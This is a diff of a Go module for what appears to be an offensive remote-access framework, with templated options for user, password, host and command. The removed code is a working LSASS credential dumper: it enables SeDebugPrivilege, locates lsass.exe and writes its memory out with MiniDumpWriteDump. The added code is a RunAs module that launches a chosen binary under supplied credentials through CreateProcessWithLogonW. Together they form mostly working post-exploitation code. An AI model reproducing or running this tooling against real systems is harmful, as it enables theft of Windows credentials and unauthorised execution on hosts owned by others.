@@ -1,11 +1,19 @@
 /*{
-Name: KashDump
+Name: RunAs
 Author: TerminalJockey
 Date: 3/15/2021
-Description: dumps lsass to file
+Description: execute target binary with given credentials
+Type:WinRemote
 Options:
 {
-	"Filename":"C:\\Windows\\Temp\\lsa.dmp",
+    "NodeID":"",
+    "Username":"",
+    "Password":"",
+    "Rhost":"",
+    "Rport":"",
+    "Directory":"",
+    "Filename":"",
+    "Cmd":"",
 }
 }*/
 
@@ -25,6 +33,38 @@ import (
 	"unicode/utf16"
 	"unsafe"
 )
+
+func main() {
+
+	err := RunWithPrivilege("SeIncreaseQuotaPrivilege", RunAs)
+	if err != nil {
+		log.Println(err)
+	}
+}
+
+func RunAs() error {
+	CreateProcessWithLogonW := modadvapi32.NewProc("CreateProcessWithLogonW")
+	lpszUsername := syscall.StringToUTF16Ptr("{{.Username}}")
+	lpszDomain := syscall.StringToUTF16Ptr("{{.Domain}}")
+	lpszPassword := syscall.StringToUTF16Ptr("{{.Password}}")
+	dwLogonFlags := 0
+	appname := syscall.StringToUTF16Ptr("{{.Filename}}")
+	cmdline := syscall.StringToUTF16Ptr("{{.Cmd}}")
+	dwCreationFlags := 0
+	env := 0
+	curdir := syscall.StringToUTF16Ptr("{{.Directory}}")
+	si := syscall.StartupInfo{}
+	pi := syscall.ProcessInformation{}
+
+	procreate, _, err := CreateProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpszUsername)), uintptr(unsafe.Pointer(lpszDomain)),
+		uintptr(unsafe.Pointer(lpszPassword)), uintptr(dwLogonFlags), uintptr(unsafe.Pointer(appname)),
+		uintptr(unsafe.Pointer(cmdline)), uintptr(dwCreationFlags), uintptr(env),
+		uintptr(unsafe.Pointer(curdir)), uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
+
+	fmt.Println(procreate)
+
+	return err
+}
 
 const (
 	SE_PRIVILEGE_ENABLED = 2
@@ -70,69 +110,6 @@ var (
 
 type PrivilegeError struct {
 	privileges []uint64
-}
-
-func main() {
-
-	err := RunWithPrivilege("SeDebugPrivilege", dumplsass)
-	if err != nil {
-		log.Println(err)
-	}
-}
-
-func dumplsass() error {
-	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
-	if err != nil {
-		log.Println("snapshot:", err)
-	}
-	var procentry syscall.ProcessEntry32
-	procentry.Size = uint32(unsafe.Sizeof(syscall.ProcessEntry32{}))
-
-	targname := [260]uint16{'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e'}
-
-
-	err = syscall.Process32First(snapshot, &procentry)
-	if err != nil {
-		log.Println(err)
-	}
-
-	var pid uint32
-
-	for {
-		if procentry.ExeFile == [260]uint16(targname) {
-			fmt.Println("success!")
-			pid = procentry.ProcessID
-		}
-		err = syscall.Process32Next(snapshot, &procentry)
-		if err != nil {
-			break
-		}
-	}
-	fmt.Println(pid)
-
-	lhandle, err := syscall.OpenProcess(0x1F0FFF, false, pid)
-	if err != nil {
-		log.Println("openprocess:", err)
-	}
-
-	outfile, err := syscall.CreateFile(syscall.StringToUTF16Ptr("{{.Filename}}"), syscall.GENERIC_ALL, 0, nil, syscall.CREATE_ALWAYS, syscall.FILE_ATTRIBUTE_NORMAL, int32(0))
-	if err != nil {
-		log.Println("createfile:", err)
-	}
-	defer syscall.Close(outfile)
-	//get minidumpwrite
-	dbgcore := syscall.NewLazyDLL("Dbghelp.dll")
-
-
-	minidumpwrite := dbgcore.NewProc("MiniDumpWriteDump")
-
-	//apparently we want incorrect parameters? Shoutout C_Sto, the real GOAT
-	isdumped, _, err := minidumpwrite.Call(uintptr(lhandle), uintptr(pid), uintptr(outfile), 3, 0, 0, 0)
-	if err != nil {
-		log.Println("isdumped:", err)
-	}
-	fmt.Println(isdumped)
-	return err
 }
 
 func RunWithPrivilege(name string, fn func() error) error {
@@ -190,16 +167,13 @@ func adjustPrivileges(token syscall.Token, privileges []uint64, action uint32) e
 	bbytes := b.Bytes()
 	bptr := &bbytes[0]
 
-
 	success, err := adjustTokenPrivileges(token, false, bptr, uint32(len(prevState)), &prevState[0], &reqSize)
 	if !success {
 		return err
 	}
-	
+
 	return nil
 }
-
-
 
 func adjustTokenPrivileges(token syscall.Token, releaseAll bool, input *byte, outputSize uint32, output *byte, requiredSize *uint32) (success bool, err error) {
 	var _p0 uint32
